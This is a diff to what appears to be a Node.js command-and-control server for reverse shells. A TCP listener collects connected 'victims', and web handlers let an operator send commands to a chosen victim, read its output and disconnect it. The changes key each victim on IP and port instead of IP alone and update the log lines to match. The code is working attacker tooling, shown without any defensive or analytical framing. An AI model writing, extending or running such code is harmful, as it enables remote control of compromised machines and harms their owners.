@@ -5,7 +5,7 @@ var victims = [];
 
 // Function passed as parameter is executed for every new connection
 net.createServer(function(sock) {
-    console.log('Victim %s connected', sock.remoteAddress );
+    console.log('Victim %s:%d connected', sock.remoteAddress, sock.remotePort);
 
     sock.commandLine = '';
     sock.previousCommandLine = '';
@@ -14,16 +14,16 @@ net.createServer(function(sock) {
     // Event listener for receiving data
     sock.on('data', function(data){
         this.commandLine += data;
-        console.log('Victim %s responded:\n%s', this.remoteAddress, data);
+        console.log('Victim %s:%d responded:\n%s', this.remoteAddress, this.remotePort, data);
     })
     // Event listeners for end of connection
     sock.on('close', function() {
         victims.splice(victims.indexOf(this), 1);
-        console.log('Victim %s disconnected', this.remoteAddress);
+        console.log('Victim %s:%d disconnected', this.remoteAddress, this.remotePort, );
     });
     sock.on('error', function (err){
         victims.splice(victims.indexOf(this), 1);
-        console.log('Victim %s disconnected because of error: %s', this.remoteAddress, err.message);  
+        console.log('Victim %s:%d disconnected because of error: %s', this.remoteAddress, this.remotePort, err.message);  
     });
 
     victims.push(sock);
@@ -45,12 +45,12 @@ function waitForResponse(victim) {
     });
 }
 
-function getVictim(ip){
-    let i = 0, found = false;
+function getVictim(ip, port){
+    let i = 0;
 
-    if (ip){
-        while (i < victims.length && !found){
-            if (victims[i].remoteAddress === ip){
+    if (ip && port){
+        while (i < victims.length){
+            if (victims[i].remoteAddress === ip && victims[i].remotePort == port){
                 return victims[i];
             }
             i++;
@@ -70,7 +70,7 @@ module.exports = {
     //     ip -> req.params.ip
     //     command -> req.body.command
     async send(req, res, next){
-        let victim = getVictim(req.params.ip);
+        let victim = getVictim(req.params.ip, req.params.port);
 
         if (!victim){
             return res.redirect(303, '/');
@@ -87,7 +87,7 @@ module.exports = {
     },
 
     getCommandLine(req, res, next){
-        let victim = getVictim(req.params.ip);
+        let victim = getVictim(req.params.ip, req.params.port);
 
         if (!victim){
             return res.redirect(303, '/');
@@ -116,7 +116,7 @@ module.exports = {
     },
 
     clearCommandLine(req, res, next){
-        let victim = getVictim(req.params.ip);
+        let victim = getVictim(req.params.ip, req.params.port);
 
         if (!victim){
             return res.redirect(303, '/');
@@ -127,13 +127,13 @@ module.exports = {
     },
 
     disconnect(req, res, next){
-        let victim = getVictim(req.params.ip);
+        let victim = getVictim(req.params.ip, req.params.port);
 
         if (!victim){
             return res.redirect(303, '/');
         }
         victim.destroy();
-        console.log("Connection with %s ended", victim.remoteAddress);
+        console.log("Connection with %s:%d ended", victim.remoteAddress, victim.remotePort);
 
         next();
     }
